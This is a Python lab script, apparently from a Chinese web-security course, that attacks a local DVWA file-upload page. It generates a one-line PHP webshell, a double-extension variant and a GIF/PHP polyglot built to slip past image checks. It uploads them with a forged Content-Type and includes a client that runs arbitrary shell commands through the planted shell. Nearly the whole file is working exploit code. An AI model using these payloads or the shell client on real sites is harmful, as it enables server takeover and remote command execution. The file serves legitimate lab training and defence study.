#!/usr/bin/env python3
"""16 · 文件上传与 Webshell —— 三类校验的绕过与一句话木马

用法:
    python3 upload_lab.py session [--level low|medium|high]        # 登录输出 cookie
    python3 upload_lab.py gen                                      # 生成三种 payload
    python3 upload_lab.py upload --file F [--level L] [--ctype C]  # 上传（可伪造声明类型）
    python3 upload_lab.py shell --url U --cmd C                    # 一句话木马客户端

payload 生成到 artifacts/：shell.php（一句话木马）、shell.php.jpg（双扩展名）、
shell.jpg（GIF 图片马：真图 + php 尾巴）。只打本机 DVWA 靶场。
"""
import argparse
import re
import sys
from pathlib import Path

import requests

BASE = "http://127.0.0.1:8612"
ART = Path(__file__).parent / "artifacts"

SHELL_PHP = "<?php system($_GET['cmd']); ?>\n"
# 43 字节合法 1x1 GIF + 一句话木马尾巴：
# getimagesize 认它是图，文件包含把它当 PHP 执行
GIF_BYTES = bytes.fromhex(
    "47494638396101000100800000ffffff000000"
    "21f90401000000002c0000000001000100"
    "0002024c01003b"
)
POLYGLOT = GIF_BYTES + b"\n" + SHELL_PHP.encode()


def login(level="low"):
    s = requests.Session()
    r = s.get(f"{BASE}/login.php", timeout=5)
    tok = re.search(r"name='user_token' value='([^']+)'", r.text).group(1)
    s.post(f"{BASE}/login.php", timeout=5,
           data={"username": "admin", "password": "password",
                 "Login": "Login", "user_token": tok})
    r = s.get(f"{BASE}/security.php", timeout=5)
    tok = re.search(r"name='user_token' value='([^']+)'", r.text).group(1)
    s.post(f"{BASE}/security.php", timeout=5,
           data={"security": level, "seclev_submit": "Submit", "user_token": tok})
    return s


def cmd_session(a):
    s = login(a.level)
    print("; ".join(f"{k}={v}" for k, v in s.cookies.items()))
    return 0


def cmd_gen(a):
    ART.mkdir(exist_ok=True)
    (ART / "shell.php").write_text(SHELL_PHP, encoding="utf-8")
    (ART / "shell.php.jpg").write_text(SHELL_PHP, encoding="utf-8")
    (ART / "shell.jpg").write_bytes(POLYGLOT)
    print(f"[gen] 三种 payload 已生成到 artifacts/：")
    print(f"[gen]   shell.php      一句话木马（{len(SHELL_PHP.encode())} 字节）")
    print(f"[gen]   shell.php.jpg  双扩展名（内容同一句话）")
    print(f"[gen]   shell.jpg      GIF 图片马（真图 + php 尾巴，{len(POLYGLOT)} 字节）")
    return 0


def cmd_upload(a):
    s = login(a.level)
    name = Path(a.file).name
    ctype = a.ctype or "application/octet-stream"
    with open(a.file, "rb") as f:
        r = s.post(f"{BASE}/vulnerabilities/upload/", timeout=10,
                   data={"Upload": "Upload"},
                   files={"uploaded": (name, f, ctype)})
    if "succesfully uploaded" in r.text:
        print(f"[upload] 文件名={name} 声明类型={ctype}（{a.level} 档）→ 上传成功")
        return 0
    print(f"[upload] 文件名={name} 声明类型={ctype}（{a.level} 档）→ 被拒绝")
    m = re.search(r"<pre>(.*?)</pre>", r.text, re.S)
    if m:
        print(f"[upload] 靶场回应：{m.group(1).strip()}")
    return 1


def cmd_shell(a):
    cmd = f"echo '<<'; {a.cmd}; echo '>>'"
    sep = "&" if "?" in a.url else "?"
    headers = {"Cookie": a.cookie} if getattr(a, "cookie", None) else {}
    r = requests.get(f"{a.url}{sep}cmd={cmd}", timeout=10, headers=headers,
                     allow_redirects=False)
    matches = re.findall(r"<<(.*?)>>", r.text, re.S)   # 先在原始响应里找哨兵
    if matches:
        out = re.sub(r"<[^>]*>", " ", matches[-1])
        out = re.sub(r"[^\x20-\x7e\u4e00-\u9fff]+", " ", out).strip()
        out = re.sub(r"\s+", " ", out)
    else:
        out = "(未捕获到输出)"
    print(f"[shell] cmd={a.cmd} → {out}")
    return 0 if matches else 1


def main():
    ap = argparse.ArgumentParser(description="文件上传与 Webshell（仅本机 DVWA）")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p0 = sub.add_parser("session")
    p0.add_argument("--level", default="low", choices=["low", "medium", "high"])
    p0.set_defaults(func=cmd_session)

    p1 = sub.add_parser("gen")
    p1.set_defaults(func=cmd_gen)

    p2 = sub.add_parser("upload")
    p2.add_argument("--file", required=True)
    p2.add_argument("--level", default="low", choices=["low", "medium", "high"])
    p2.add_argument("--ctype", default=None, help="伪造的声明类型（multipart 里的 Content-Type）")
    p2.set_defaults(func=cmd_upload)

    p3 = sub.add_parser("shell")
    p3.add_argument("--url", required=True)
    p3.add_argument("--cmd", required=True)
    p3.add_argument("--cookie", default=None, help="随请求携带的会话 cookie（文件包含点需要登录）")
    p3.set_defaults(func=cmd_shell)

    args = ap.parse_args()
    return args.func(args)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] 已中断", file=sys.stderr)
        sys.exit(130)
